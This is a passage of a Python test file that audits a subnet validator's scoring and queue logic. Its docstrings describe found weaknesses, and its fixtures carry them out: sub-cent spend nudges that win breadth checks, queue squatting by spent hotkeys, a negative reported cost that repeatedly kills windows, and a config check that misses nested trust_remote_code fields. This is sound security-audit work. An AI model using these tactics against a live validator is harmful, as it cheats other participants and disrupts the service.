    queueing them anyway is worse than turning them away, not kinder.
    """
    v, tree = validator(tmp_path)
    broken = model_tree(tmp_path / "broken", pickled=True)
    queue = [submit(v, f"ch-{i:02d}", 10 + i, v.pins.king_zero, broken)
             for i in range(MAX_QUEUE_DEPTH + 2)]
    turned_away = [sub.hotkey for sub in queue[MAX_QUEUE_DEPTH:]]

    report = v.run_window(1, queue)

    assert len([o for o in report.outcomes if o.status == REFUSED]) == MAX_QUEUE_DEPTH
    for hotkey in turned_away:
        row = outcome_of(report, hotkey)
        assert row.status == UNQUEUED and not row.shot_spent and hotkey not in v.spent
        assert f"MAX_QUEUE_DEPTH={MAX_QUEUE_DEPTH}" in row.detail


# ==================================================================================================
# PART B — what the fixes opened. Every test here PASSES and describes today's behaviour.
# ==================================================================================================


def test_both_breadth_conditions_are_bought_for_one_hundredth_of_a_cent():
    """**A FINDING, AND IT RE-OPENS D16.** Breadth gates on the SIGN of a continuous quantity.

    §5.2 gates conditions 2 and 3 at zero rather than at `eps`, for §5.2b's reason: requiring `eps`
    on every subset would multiply the bar and refuse challengers for being merely broad. That
    argument is about SUBSETS, and it does not carry to a per-benchmark delta, because `final_b` is
    `quality_b − λ_b·spend_b/C_b` and SPEND IS CONTINUOUS AND MINER-CONTROLLED. A challenger that
    routes a benchmark identically to the king but spends a hundredth of a cent less per task there
    has bought a strictly positive delta on it.

    So D16's own attack survives at the price of four such nudges. The arm below is the submission
    D16 names — "the king plus two benchmark-specific overrides" — byte-identical on six benchmarks,
    +0.60 on two, and one hundredth of a cent per task cheaper on four. It is CROWNED.

    The nudge is a real improvement, and that is the point rather than a defence of it: §5.3 sells
    condition 3 as "more than half your subjects must have improved", and what the code asks is that
    more than half improved BY ANY AMOUNT WHATSOEVER. The 1e-5 here is arbitrary — 1e-15 works
    identically, because the comparison is `> 0.0` — so the sentence the rule is sold with and the
    rule are different rules. `quality_b` is untouched on all ten non-override benchmarks, so
    nothing about the routing got broader; only the dollar figure moved.
    """
    cheap: list[EpisodeResult] = []
    strong: list[EpisodeResult] = []
    for i in range(BENCHMARKS):
        name = f"bench{i:02d}"
        cheap += rows(name, 0.30, 0.01)
        strong += rows(name, 0.90, 1.00)
    exchange = derive_exchange(cheap, strong, pinned_cost([*cheap, *strong]))
    assert not any(rate.flags for rate in exchange.values()), "a healthy corpus, no guard involved"

    pairs = []
    for i in range(BENCHMARKS):
        name = f"bench{i:02d}"
        if i < 2:
            challenger = (0.90, 0.01)             # the two real overrides
        elif i < 6:
            challenger = (0.30, 0.01 - 1e-5)      # THE NUDGE: same routing, a hair cheaper
        else:
            challenger = (0.30, 0.01)             # byte-identical to the king
        pairs.append(BenchmarkPair(name,
                                   np.full(TASKS_PER, 0.30), np.full(TASKS_PER, 0.01),
                                   np.full(TASKS_PER, challenger[0]),
                                   np.full(TASKS_PER, challenger[1])))

    verdict = duel(pairs, priced(exchange), nonce="window-1")

    per_benchmark = dict(verdict.by_benchmark)
    assert per_benchmark["bench00"] == pytest.approx(0.60)          # the win is here...
    assert 0.0 < per_benchmark["bench02"] < 1e-5                    # ...and this is what bought it
    assert per_benchmark["bench06"] == 0.0
    # CLOSED 2026-09-01 by `config.BREADTH_FLOOR`. When this finding was written both breadth
    # conditions gated on the raw sign, so the four 1e-5-dollar nudges each read as a benchmark
    # "won" and the median came out at +3.03e-06 — positive, and enough. Sub-floor movement is now
    # zeroed before breadth is judged, so the same arm's median is EXACTLY 0.0 and condition 3
    # refuses it. `loo_min` still passes, which is the point of keeping both conditions: the median
    # is what catches a win concentrated in two benchmarks.
    assert verdict.loo_min > 0.0, "leave-one-out alone never refused this — the median does"
    assert verdict.median == 0.0, "the four nudges are below BREADTH_FLOOR and no longer count"
    assert not verdict.challenger_wins, "a hundredth of a cent no longer buys the crown"
    # Two benchmarks of twelve carry 99.99% of the aggregate, and the sign test says so.
    assert verdict.sign_wins == 6
    assert sum(d for _, d in verdict.by_benchmark if d > 1e-3) / \
        sum(d for _, d in verdict.by_benchmark) > 0.9999

    # And the same arm WITHOUT the four nudges — the shape the spec measured — is refused, which is
    # what makes this a finding about the gate rather than about the fixture.
    honest = [BenchmarkPair(p.benchmark, p.king_quality, p.king_spend,
                            p.challenger_quality, p.king_spend) for p in pairs]
    assert not duel(honest, priced(exchange), nonce="window-1").challenger_wins


def test_a_one_benchmark_specialist_clears_breadth_about_two_times_in_five():
    """**A FINDING** — the same defect as a RATE, which is how it will be met in production.

    §5.3's k-sweep ("breadth binds up to k = 5, smallest crowned concentration k = 6 of 12") is
    measured on a fixture in which a non-winning benchmark's delta is bit-exactly 0.0. Two real arms
    never produce that: `final_b` prices spend, and two policies that agree on every routing
    decision still differ in tokens and therefore in dollars. Replace the exact zeros with ordinary
    noise and the sweep's conclusion inverts.

    Measured below on a pure ONE-benchmark specialist — k = 1, the concentration §5.3 says is the
    one thing leave-one-out was always able to refuse. At sigma = 0 it is crowned 0 times in 200. At
    any nonzero sigma it is crowned roughly two times in five, because `loo_min` and `median` have
    both become coin flips on the sign of noise.

    The magnitude of the noise does not matter, which is the tell that this is a sign test rather
    than a threshold: 1e-6 and 1e-2 give the same rate.
    """
    trials, n_boot = 200, 40           # n_boot only sets `lcb`, which the huge win clears anyway
    # Comfortably clear of `eps` so that condition 1 never decides anything here — the finding is
    # about conditions 2 and 3, and a win sitting on the margin would let the noise refuse it for
    # the wrong reason.
    whole_win = EPS * BENCHMARKS * 1.5

    def crown_rate(sigma: float) -> float:
        # Seeded PER SIGMA rather than from one shared generator: the original drew from a single
        # rng across every call, so adding or reordering a sigma silently changed every later
        # measurement. A rate this test asserts on must not depend on how many rates preceded it.
        rng = np.random.default_rng(4242)
        crowned = 0
        for t in range(trials):
            noise = rng.normal(0.0, sigma, BENCHMARKS - 1) if sigma else np.zeros(BENCHMARKS - 1)
            verdict = duel(spread_over([whole_win, *noise]), quality_only, seed=t + 1,
                           n_boot=n_boot)
            # Condition 1 must be the thing that ISN'T deciding, or the rate stops measuring
            # breadth. At large sigma the noise can drag the aggregate under `eps`, so such trials
            # are skipped rather than counted as a refusal breadth earned.
            if not (verdict.delta > EPS and verdict.lcb > 0.0):
                continue
            crowned += verdict.challenger_wins
        return crowned / trials

    # PARTIALLY CLOSED 2026-09-01, and the residual is the finding. `config.BREADTH_FLOOR` (EPS/10
    # = 0.005) zeroes sub-floor movement before breadth is judged, which converts a uniform 38-49%
    # hole into one that depends on how large the per-benchmark noise is relative to the floor.
    # Measured over 200 trials each:
    #
    #     sigma 0      -> 0.0%      sigma 5e-3 -> 3.5%
    #     sigma 1e-6   -> 0.0%      sigma 1e-2 -> 18.0%
    #     sigma 1e-3   -> 0.0%      sigma 5e-2 -> 49.5%
    #
    # *** WHY THIS IS STILL A FINDING, AND WHY RAISING THE FLOOR IS NOT THE FIX. ***
    # Real per-benchmark noise is not 1e-3. At ~20 tasks per benchmark the bootstrap SE of a
    # per-benchmark delta is order 0.11 — twenty times the floor — so IN PRODUCTION AS CURRENTLY
    # SIZED this sits in the right-hand column and breadth is still largely a coin flip. Raising the
    # floor to meet it was implemented and measured to refuse a genuine uniform +0.03 challenger
    # (`test_a_uniform_three_point_challenger_is_refused_by_eps_not_by_breadth`), which is the
    # "refuses real challengers" failure §5.3 forbids. No per-benchmark threshold separates a 0.03
    # signal from a 0.11 standard error.
    #
    # *** THE LAST PARAGRAPH USED TO SAY THIS IS A SAMPLE-SIZE PROBLEM THAT "CLOSES BY RAISING TASKS
    # PER BENCHMARK". THAT WAS WRONG, AND IT IS CORRECTED HERE RATHER THAN DELETED. ***
    # Re-measured 2026-09-01 on a generative model this fixture does not have — pass/fail paired
    # quality, the [0,1] headroom bound, real spend noise — at the corpus's own shape of N = 3
    # benchmarks (`scripts/breadth_power.py`, the corpus record §3):
    #
    #   * more tasks BARELY move the one-benchmark specialist: crowned 50.2% at 83 tasks/benchmark,
    #     49.8% at 250, 46.8% at 1,000. Breadth's own share of the refusal does rise (39% -> 47% ->
    #     53% of what condition 1 admits), but condition 1 stops refusing at the same rate, so the
    #     crown rate stands still. Tasks are not the lever.
    #   * for a TWO-of-three specialist more tasks make it strictly WORSE — 55.5% at 83, 73.8% at
    #     1,000, 99.2% at 16,000 — because the median of [x, x, d3] is x for any d3.
    #   * the lever with the right sign is the BENCHMARK COUNT, at a fixed total task budget.
    #
    # And breadth is not "largely a coin flip" at N = 3 either: it refuses 26-57% of one-benchmark
    # specialists for 0-1.7% of genuinely broad ones, which is why it was kept as a gate when the
    # 2026-09-01 sweep re-opened the question. `DuelVerdict.noise_floor` publishes the per-benchmark
    # SE every window so the remaining gap is visible rather than implicit.
    assert crown_rate(0.0) == 0.0
    for sigma in (1e-6, 1e-3):
        assert crown_rate(sigma) == 0.0, f"sigma {sigma} is below the floor and must be refused"
    for sigma, floor_rate in ((1e-2, 0.05),):
        rate = crown_rate(sigma)
        assert rate > floor_rate, (
            f"sigma {sigma}: crowned {rate:.1%} — the residual sample-size hole is REAL and this "
            "test exists to keep it visible; if it has closed, find out why before deleting it")


def test_the_power_gate_measures_a_set_the_score_does_not():
    """**A FINDING.** §5.1b's exclusion changed what is SCORED and nothing changed what is GATED.

    `reference._pairs` builds the gate's pairs from every benchmark in the reference arms;
    `simulate._pairs` drops the flagged ones before the duel. So there are two definitions of the
    admitted set, and the window is admitted on one and scored on the other.

    The gate's floor is `EPS` "on purpose, not chosen: a window in which two FIXED policies differ
    by less than that cannot produce a coronation that is anything but noise". That argument is only
    valid if the gate measures the set the coronation is computed on. Below it does not: the window
    passes at a spread of +0.3347 carried entirely by a benchmark §5.1b excludes, while the corpus
    the duel will actually run over separates by +0.0020 — twenty-five times under the floor.

    `LAMBDA_UNDEFINED` is the guard that makes this reachable rather than exotic: it fires on a
    benchmark where the two fixed policies cost the SAME, which says nothing at all about their
    quality, so an excluded benchmark may carry the largest quality spread in the corpus.
    """
    cheap = rows("flat-cost-huge-gap", 0.00, 1.00, 20)
    strong = rows("flat-cost-huge-gap", 1.00, 1.00, 20)
    for name in ("admitted-a", "admitted-b"):
        cheap += rows(name, 0.500, 0.10, 20)
        strong += rows(name, 0.502, 1.00, 20)

    exchange = derive_exchange(cheap, strong, pinned_cost([*cheap, *strong]))
    assert exchange["flat-cost-huge-gap"].flags == (LAMBDA_UNDEFINED,)
    admitted = {name for name, rate in exchange.items() if not rate.flags}
    assert admitted == {"admitted-a", "admitted-b"}

    gated = power_gate(ReferenceArm(ALWAYS_CHEAPEST, tuple(cheap)),
                       ReferenceArm(ALWAYS_STRONGEST, tuple(strong)), seed=7)
    scored = power_gate(
        ReferenceArm(ALWAYS_CHEAPEST, tuple(r for r in cheap if r.benchmark in admitted)),
        ReferenceArm(ALWAYS_STRONGEST, tuple(r for r in strong if r.benchmark in admitted)),
        seed=7)

    assert gated.separates and gated.spread == pytest.approx(0.3347, abs=5e-4)
    assert not scored.separates and scored.spread == pytest.approx(0.0020, abs=5e-4)
    # The gate's published sentence names the benchmark it was carried by nowhere at all.
    assert "flat-cost-huge-gap" not in gated.reason
    # And the arm the duel is computed on has already dropped it.
    assert [name for name, _ in score_arm(cheap, exchange).excluded] == ["flat-cost-huge-gap"]


def test_the_dominator_guard_excludes_exactly_the_benchmarks_routing_could_win():
    """**A FINDING, and it is the one that decides whether the subnet has anything to buy.**

    `derive_exchange` fits λ_b between always-cheapest and always-STRONGEST, and "strongest" is
    `_by_price`'s top rung — most expensive. `reference._by_price` is honest that this is a proxy
    ("PRICE IS THE ONLY CAPABILITY SIGNAL A COMMITTED SNAPSHOT CARRIES"), and §5.1b then treats the
    proxy's failure as a property of the BENCHMARK: `q_strongest ≤ q_cheapest` fires DOMINATOR and,
    since the exclusion fix, removes the benchmark from the score entirely.

    But a benchmark on which the price ladder's top rung fails and a mid-priced model succeeds is
    not a dead benchmark. **It is the definition of a benchmark where routing beats the price
    ladder** — the whole capturable band, in one row. The measurement below is on the world this
    repository built precisely to have that shape (prices deliberately NOT a capability ranking):

        benchmark        cheapest  priciest  mid-priced   flags
        frontier-swe       0.00      0.00      1.00       DOMINATOR   <- excluded
        nl2repo            0.00      1.00      1.00       -
        programbench       0.00      1.00      1.00       -

    So the corpus keeps the two benchmarks where buying the top rung already works and drops the one
    where a router is worth anything. Before the exclusion fix that benchmark was scored on quality
    with spend unpriced, which was its own hole (FINDING 6) — but it was scored. The repair traded a
    pricing hole for a selection one, and §5.1b's justification ("a benchmark the admission gate
    should have dropped") assumes the guard identifies dead benchmarks, which on a pool where price
    does not track capability it does not.

    RESOLVED 2026-09-07 — `reference.fit_pool` now fits λ between the floor and KING₀ (§5.5), not
    always-strongest, and King₀ is the cascade, which climbs to `mock/mid` here. Under that pair this
    benchmark PRICES (the mock corpus tests use `DEAD`, difficulty 4, for a benchmark nobody can do).
    This test keeps calling `derive_exchange` on the OLD pair directly, so the table below stays
    reproducible as the record of what the old rule threw away. On the live pool the same repair
    took λ from a coin flip to +0.19 / +0.17 with intervals clear of zero (the M3a record).
    """
    tasks = tuple(task for benchmark in LIVE for task in benchmark.load())
    grade = suite_grade(LIVE)

    def arm(policy):
        worker = MockWorker(answers=worker_answers(STRENGTH), costs=COST)
        return [e.result for e in Scaffold(CATALOG, policy, worker, grade).run_window(
            tasks, nonce="n", budget_usd=float("inf"))]

    from thirtyspokes.v3.reference import FixedPolicy
    cheapest, priciest = arm(always_cheapest(CATALOG)), arm(always_strongest(CATALOG))
    mid = arm(FixedPolicy("mid-only", ("mock/mid",)))
    exchange = derive_exchange(cheapest, priciest, pinned_cost([*cheapest, *priciest]))

    def quality(results, benchmark):
        scores = [r.graded_score for r in results if r.benchmark == benchmark]
        return sum(scores) / len(scores)

    assert exchange["frontier-swe"].flags == (DOMINATOR,)
    # Both fixed extremes score zero on it, and a mid-priced model scores one: the largest possible
    # routable band in this corpus, and the only benchmark that is excluded.
    assert (quality(cheapest, "frontier-swe"), quality(priciest, "frontier-swe")) == (0.0, 0.0)
    assert quality(mid, "frontier-swe") == 1.0
    for kept in ("nl2repo", "programbench"):
        assert exchange[kept].flags == ()
        assert quality(priciest, kept) == quality(mid, kept) == 1.0   # money already works here

    # And it is gone from the score, so no verdict can ever reward reaching it.
    assert [name for name, _ in score_arm(mid, exchange).excluded] == ["frontier-swe"]


def test_a_corpus_with_one_admitted_benchmark_launches_and_then_every_window_dies(tmp_path):
    """**A FINDING.** §5.1b's "refuse to launch" is implemented at zero admitted, not at one.

    "If every benchmark fires, there is no corpus to launch on ... the response is to refuse to
    launch." `score_arm` does refuse an arm with nothing admitted, and `pin_corpus` inherits that
    through `king_zero`. At ONE admitted benchmark nothing refuses: the corpus pins cleanly, the
    power gate passes, both arms run and are paid for, and the window then dies inside `duel` —
    which needs two benchmarks, because leave-one-out over one would score the challenger on an
    empty slice.

    The failure is an uncaught `ValueError` out of `Validator.run_window`, not a `WindowError` the
    caller can skip on, so it takes the whole window rather than deferring it. Every window on this
    corpus dies the same way, forever, at full cost.
    """
    corpus = (DEAD,                                                                  # DOMINATOR
              MockBenchmark("nl2repo", STRENGTH, n_tasks=4, difficulty=(2, 2)))        # admitted
    v, tree = validator(tmp_path, corpus)

    flags = {name: bool(rate.flags) for name, rate in v.pins.world.exchange.items()}
    assert flags == {"frontier-swe": True, "nl2repo": False}, "one admitted benchmark, and it pins"

    with pytest.raises(ValueError, match="breadth cannot be judged on 1 benchmark"):
        v.run_window(1, [submit(v, "hopeful", 5, learned_router(v.pins.king_zero, ("nl2repo",),
                                                                "mock/mid"), tree)])
    # Nothing was recorded, so a restart repeats it rather than moving past it (§8b.5).
    assert v.spent == set() and v.coronations == []


def test_spent_hotkeys_occupy_the_queue_and_starve_every_newcomer_forever(tmp_path):
    """**A FINDING.** `MAX_QUEUE_DEPTH` is applied BEFORE the one-shot filter (§7, §8b.1).

    A hotkey that has already been judged can never be judged again — it is `SKIPPED`, costs nothing
    and produces nothing — but its commit stays on chain, so it keeps its place in the
    `(commit_block, hotkey)` order and consumes one of the sixteen slots. Sixteen judged hotkeys
    with early commit blocks therefore turn away every later challenger, permanently.

    This is exactly the outcome §8b.1's cap exists to prevent, arriving through the cap: the
    newcomer's shot is intact and unspendable, and it will be deregistered waiting. The repair is
    ordering, not arithmetic — filter `self.spent` before the depth slice, since a skipped hotkey
    consumes no duel, no download and no clock.
    """
    v, tree = validator(tmp_path)
    broken = model_tree(tmp_path / "broken", pickled=True)
    squatters = [submit(v, f"old-{i:02d}", i, v.pins.king_zero, broken)
                 for i in range(MAX_QUEUE_DEPTH)]

    first = v.run_window(1, squatters)
    assert {o.status for o in first.outcomes} == {REFUSED}
    assert len(v.spent) == MAX_QUEUE_DEPTH

    newcomer = submit(v, "newcomer", 9_999, learned_router(v.pins.king_zero, ROUTABLE, "mock/mid"),
                      tree)
    second = v.run_window(2, squatters + [newcomer])

    statuses = {o.hotkey: o.status for o in second.outcomes}
    assert statuses["newcomer"] == UNQUEUED
    assert sum(1 for s in statuses.values() if s == SKIPPED) == MAX_QUEUE_DEPTH
    assert "newcomer" not in v.spent          # its one shot is intact, and unspendable
    # And it stays that way: the squatters never leave, so neither does the newcomer.
    third = v.run_window(3, squatters + [newcomer])
    assert outcome_of(third, "newcomer").status == UNQUEUED


def test_one_challengers_bad_number_kills_the_window_and_costs_that_challenger_nothing(tmp_path):
    """**A FINDING** — the negative-cost fix turned a scoring bug into an availability bug.

    `ScaffoldError` is raised, correctly, rather than clamped, and its own docstring prices the
    trade as "at most one window". That pricing assumes the bad number is the OWNER's — a broken
    grader — and it is wrong for a per-challenger fault: the raise leaves `Validator.run_window`
    uncaught, so

      * the window is destroyed for every other queued challenger, whose shots are untouched but
        whose wait is not;
      * the king's arm has already been paid for (phase 3 runs before phase 4);
      * and the offender's shot is NEVER spent, because `self.spent.add` happens after the arms run.

    So the attack is free and repeatable, which is what separates it from a bug. §11-1 records that
    a miner influences what happens on their own OpenRouter key (BYOK, provider preferences) and
    calls it the largest remaining hole; the cost figure travels that path.

    The scaffold's refusal is right. The scope is not: a number that arrives on ONE challenger's arm
    should refuse THAT challenger (invalid submission, shot spent, §8b.2) and leave the window
    standing.
    """
    honest = MockWorker(answers=worker_answers(STRENGTH), costs=COST)

    class Refunding:
        """Reports a negative cost, but only for the model the attacker's policy delegates to."""

        def complete(self, model_id, text, params):
            answer, cost = honest.complete(model_id, text, params)
            return answer, (-5.0 if model_id == "mock/heavy" else cost)

    from thirtyspokes.v3.reference import FixedPolicy
    v, tree = validator(tmp_path, worker=Refunding())
    victim = submit(v, "victim", 5, learned_router(v.pins.king_zero, ROUTABLE, "mock/mid"), tree)
    attacker = submit(v, "attacker", 6, FixedPolicy("attacker", ("mock/heavy",)), tree)

    with pytest.raises(ScaffoldError, match="reported a cost of -5.0"):
        v.run_window(1, [victim, attacker])

    assert v.spent == set(), "nobody's shot was spent, including the attacker's"
    assert v.coronations == []
    # Repeatable: the same queue, the same window, the same death, for as long as it likes.
    with pytest.raises(ScaffoldError):
        v.run_window(2, [victim, attacker])


def test_a_king_arm_the_validators_own_clock_truncated_still_decides_every_duel(tmp_path):
    """**A FINDING.** §8b.2 names the obligation and no caller discharges it.

    "If the KING's arm hits the clock, §5.2a means the zeroed tail is shared by every duel in that
    window, so the owner's own slowness would decide all of them at once — such a window should be
    treated as the power gate treats a dead window (no duels, no shot spent) rather than scored."
    `Scaffold.run_window` makes it detectable and says so in its own docstring; `simulate.Validator`
    never looks.

    Measured below: six of fifteen king tasks abandoned by the validator's clock, the window scored
    anyway, and the challenger crowned on a tail the king was never allowed to attempt.

    Two smaller silences travel with it, and both are §5.8's rule broken in the same place — a
    verdict decided by something other than routing must be visible in the reveal rather than
    buried: `simulate._exhausted` counts only `budget_exhausted`, so `king_exhausted` reads 0 for an
    arm that ran out of clock; and the string `duel_wall_clock` appears nowhere in the published
    reveal.
    """
    clock = Stopwatch(EPISODE_WALL_CLOCK_SECONDS * 0.9)
    slow = SlowWorker(MockWorker(answers=worker_answers(STRENGTH), costs=COST), clock)
    corpus = (MockBenchmark("frontier-swe", STRENGTH, n_tasks=6, difficulty=(4, 4)),
              MockBenchmark("nl2repo", STRENGTH, n_tasks=6, difficulty=(2, 2)),
              MockBenchmark("programbench", STRENGTH, n_tasks=6, difficulty=(2, 2)))
    v, tree = validator(tmp_path, corpus, worker=slow, per_benchmark=5, minimum=3, clock=clock)

    report = v.run_window(
        1, [submit(v, "hopeful", 5, learned_router(v.pins.king_zero, ROUTABLE, "mock/mid"), tree)])

    reasons = [result.stopped_reason for result in report.king_results]
    truncated = sum(1 for r in reasons if r == DUEL_WALL_CLOCK_REASON)
    assert truncated > 0, "the king's arm never hit the clock; this proves nothing"
    assert report.scored and outcome_of(report, "hopeful").status == DUELLED
    assert report.crowned == "hopeful"          # decided on a tail the king never ran
    assert report.king_exhausted == 0           # §5.8's published number cannot see it
    assert DUEL_WALL_CLOCK_REASON not in format_window(report)
    # The check §8b.2 asks the caller to make is one line, and it is available on the record.
    assert any(r.stopped_reason == DUEL_WALL_CLOCK_REASON for r in report.king_results)


def test_a_king_that_leaves_mid_window_pays_every_pensioner_one_rank_too_high(tmp_path):
    """**A FINDING.** The reign is resolved at window OPEN; the metagraph is re-read at window
    CLOSE.

    `_resolve_reign` runs once, at the top of `run_window`, and `_publish` then calls
    `self.chain.hotkeys()` again to build the slate. The two reads are of different instants, so a
    king that deregisters between them is simultaneously "reigning" (excluded from its own lineage)
    and "unresolvable" (paid nothing) — which is precisely the §5.5 payout bug the reversion was
    written to close, surviving for exactly one window.

    The half §5.5 calls invisible really is invisible: the crown's 0.85 burns either way. What moves
    is the pension — every survivor is paid one rank too high, and the 0.02 that should have burned
    in the rank-1 slot the deposed king was dethroned into is paid out instead.
    """
    v, tree = validator(tmp_path)
    for hotkey in ("first", "second"):
        v.chain.register(hotkey)

    class LeavesMidArm:
        """A king whose hotkey is deregistered part-way through its own arm."""

        def __init__(self, inner, chain, hotkey):
            self.inner, self.chain, self.hotkey, self.calls = inner, chain, hotkey, 0

        def act(self, prompt: str) -> str:
            self.calls += 1
            if self.calls == 3:
                self.chain.deregister(self.hotkey)
            return self.inner.act(prompt)

    v.king = submit(v, "third", 1, LeavesMidArm(v.pins.king_zero, v.chain, "third"), tree)
    v.coronations.extend(["first", "second", "third"])

    # The challenger is a Copier so that the window crowns NOBODY (D14: a copy ties, and a tie keeps
    # the crown where it is). A coronation would replace the reigning hotkey before `_publish` reads
    # it and would hide the defect behind a correct answer reached for another reason.
    report = v.run_window(1, [submit(v, "twin", 5, Copier(v.pins.king_zero), tree)])
    assert report.crowned is None

    assert "third" not in report.metagraph.values()      # it is gone by the time weights are set
    assert report.king_hotkey == "third"                 # and still recorded as reigning
    paid = {report.metagraph.get(uid, "burn"): share for uid, share in report.weights.items()}
    assert (paid["second"], paid["first"]) == (pytest.approx(0.05), pytest.approx(0.04))

    # What the NEXT window pays, once `_resolve_reign` has seen the same fact — one rank lower each,
    # which is the correct schedule. One window was paid on the wrong one.
    lineage = Lineage.from_coronations(v.coronations)
    correct = emission_weights(lineage, KING0, report.metagraph)
    by_hotkey = {report.metagraph.get(uid, "burn"): share for uid, share in correct.items()}
    assert (by_hotkey["second"], by_hotkey["first"]) == (pytest.approx(0.04), pytest.approx(0.03))
    # The crown's 0.85 burns in both slates; the error is 0.02 of pension paid out of the burn.
    assert paid["burn"] == pytest.approx(by_hotkey["burn"] - 0.02)
    assert paid["burn"] >= 0.85 and by_hotkey["burn"] >= 0.85


def test_the_exclusion_is_recorded_on_the_arm_and_never_reaches_the_reveal(tmp_path):
    """**A FINDING.** §5.1b requires the exclusion to be *announced*.

    "The exclusion is announced: a silent change to what miners are optimising would break the
    'Kind' property outright." `ArmScore.excluded` carries the benchmark and the guard that fired,
    so the DATA is there — but no formatter prints it. `simulate._score_rows` and
    `devkit._score_section` both iterate `per_benchmark` only, so a miner reads a reveal in which a
    benchmark they trained against has simply gone missing from the table, with nothing saying why
    or that it happened.

    The number the reveal DOES print makes the silence worse rather than better: the header counts
    the benchmarks in the slice, and the score table counts the admitted ones, so the two disagree
    with no line explaining the difference.
    """
    v, tree = validator(tmp_path, DEAD_LIVE)
    report = v.run_window(
        1, [submit(v, "hopeful", 5, learned_router(v.pins.king_zero, ROUTABLE, "mock/mid"), tree)])

    excluded = [name for name, _ in report.king.excluded]
    assert excluded == ["frontier-swe"], "no benchmark was excluded; this proves nothing"

    reveal = format_window(report)
    assert DOMINATOR not in reveal                      # the guard's own published sentence
    king_section = reveal.split("# KING ARM")[1].split("# QUEUE")[0]
    assert "frontier-swe" not in king_section           # the row is simply gone from the table
    assert "exclud" not in king_section
    # The slice header still names it, and the score table silently does not: the reveal states two
    # benchmark counts and explains neither the difference nor which benchmark makes it.
    assert "frontier-swe" in report.benchmarks and "frontier-swe" in reveal.split("# KING ARM")[0]
    assert "frontier-swe" not in {row.benchmark for row in report.king.per_benchmark}


def test_the_custom_code_field_check_does_not_look_inside_a_list(tmp_path):
    """**A FINDING**, small and precise: the check's claim is wider than the check.

    `_refuse_custom_code_fields` documents itself as "anywhere in the file is the property here
    exactly as anywhere in the tree is for the files", and recurses into `Mapping` values only. A
    code-asking field nested inside a LIST is admitted.

    Severity is low — no `transformers` config known today reads `auto_map` out of a list — but the
    docstring's claim is what a future reviewer will check the code against, and it is false as
    written. Two lines fix it (recurse into sequences that are not `str`/`bytes`), which is cheaper
    than the argument about whether some serving stack does.
    """
    reference = describe(model_tree(tmp_path / "ref"))

    for label, extra in (
            ("list of sub-configs", {"sub_configs": [{"auto_map": {"AutoModel": "modeling_x.M"}}]}),
            ("list of experts", {"experts": [{"trust_remote_code": True}]})):
        admit(model_tree(tmp_path / label.replace(" ", "-"), config_extra=extra), reference)

    # The same field one level up, in a mapping, is refused — so this is the traversal and not the
    # field list.
    with pytest.raises(AdmissionError, match="custom-code config refused"):
        admit(model_tree(tmp_path / "mapping",
                         config_extra={"sub_configs": {"a": {"auto_map": {"AutoModel": "x.M"}}}}),
              reference)


# ==================================================================================================
# PART C — attacks that correctly failed. These are the ones that must keep failing.
# ==================================================================================================


def test_a_challenger_cannot_move_the_admitted_set(tmp_path):
    """The first thing to try once exclusion moves a verdict: can a challenger fire a guard?

    It cannot, and the reason is structural rather than defensive. `derive_exchange` has no
    parameter a challenger could enter through — it reads the two FIXED-policy sweep arms and
    `c_per_task`, nothing else — λ is pinned per corpus at `pin_corpus` and never recomputed per
    window (§5.1b), and `simulate._pairs` filters on that one pinned table. So the admitted set is
    identical for every challenger in every window, which is also what keeps leave-one-out
    comparable across them (§6.3b).

    Driven through the whole validator rather than through `derive_exchange` alone, because the
    claim is about the pipeline: three challengers of opposite shapes — a router, a
    free-but-useless policy and one that burns money on every task — must produce the same admitted
    set and the same excluded set.
    """
    from thirtyspokes.v3.reference import FixedPolicy
    v, tree = validator(tmp_path, DEAD_LIVE)
    pinned = dict(v.pins.world.exchange)

    challengers = [
        submit(v, "router", 5, learned_router(v.pins.king_zero, ROUTABLE, "mock/mid"), tree),
        submit(v, "miser", 6, FixedPolicy("miser", ("mock/cheap",)), tree),
        submit(v, "burner", 7, FixedPolicy("burner", ("mock/premium",)), tree)]

    report = v.run_window(1, challengers)

    assert dict(v.pins.world.exchange) == pinned, "the pinned table moved during a window"
    admitted = {"nl2repo", "programbench"}
    for sub in challengers:
        row = outcome_of(report, sub.hotkey)
        assert row.status == DUELLED
        assert set(row.verdict.benchmarks) == admitted
        assert [name for name, _ in row.arm.excluded] == ["frontier-swe"]


def test_a_corpus_where_every_benchmark_fires_a_guard_refuses_to_launch():
    """§5.1b's launch refusal, at the one place it IS implemented.

    "If every benchmark fires, there is no corpus to launch on; that is a finding about the model
    market, and the response is to refuse to launch, not to score the whole arena on unpriced
    quality." `score_arm` refuses, and `pin_corpus` inherits the refusal through `king_zero`, so the
    corpus never becomes a `Pins`. (What it does NOT catch is one admitted benchmark — see PART B.)
    """
    cheap = rows("a", 0.50, 0.01) + rows("b", 0.50, 0.01)
    strong = rows("a", 0.50, 1.00) + rows("b", 0.40, 1.00)
    exchange = derive_exchange(cheap, strong, pinned_cost([*cheap, *strong]))
    assert all(rate.flags for rate in exchange.values())

    with pytest.raises(ValueError, match="every benchmark in this arm is excluded"):
        score_arm(cheap, exchange)


def test_a_one_model_catalog_collapses_every_ladder_but_cannot_reach_a_window():
    """The contrast fix's remaining blind spot, and why it is unreachable.

    With one model in the catalog all three ladders dedupe to the same single rung, so
    `contrast_for` returns a name-different policy with an identical top rung — the §5.6 defect
    surviving by a third route. It never reaches a window: the two sweep arms then spend exactly the
    same, the relspend spread is 0, every benchmark is `LAMBDA_UNDEFINED`, and `pin_corpus` refuses
    through `score_arm`.

    Recorded rather than fixed, because the refusal a caller sees ("every benchmark in this arm is
    excluded") describes the symptom and not the cause. §5.6 asks for the pair to be asserted to
    separate on the admission sweep before it is pinned, which is where this would read correctly.
    """
    one = Catalog(entries=(CatalogEntry("only/model", 1.0, 1.0, 128_000),))
    assert always_cheapest(one).rungs == always_strongest(one).rungs == cascade(one).rungs
    assert contrast_for(CASCADE) == ALWAYS_CHEAPEST      # a different NAME, the same ladder

    cheap = rows("a", 0.5, 1.0) + rows("b", 0.5, 1.0)
    with pytest.raises(ValueError, match="every benchmark in this arm is excluded"):
        score_arm(cheap, derive_exchange(cheap, cheap, pinned_cost([*cheap, *cheap])))


def test_a_fully_price_inverted_pool_cannot_launch_at_all():
    """The literal form of "does the new contrast separate where price does NOT track capability?"

    On a pool where the cheapest model is the strongest, the question never arises:
    `derive_exchange` reads "strongest" as "most expensive", so `q_strongest ≤ q_cheapest` on EVERY
    benchmark, every one is DOMINATOR-flagged, and `score_arm` refuses the corpus before any
    contrast is chosen. The contrast rule is therefore not the thing that fails there — the λ fit
    is, and it fails closed.

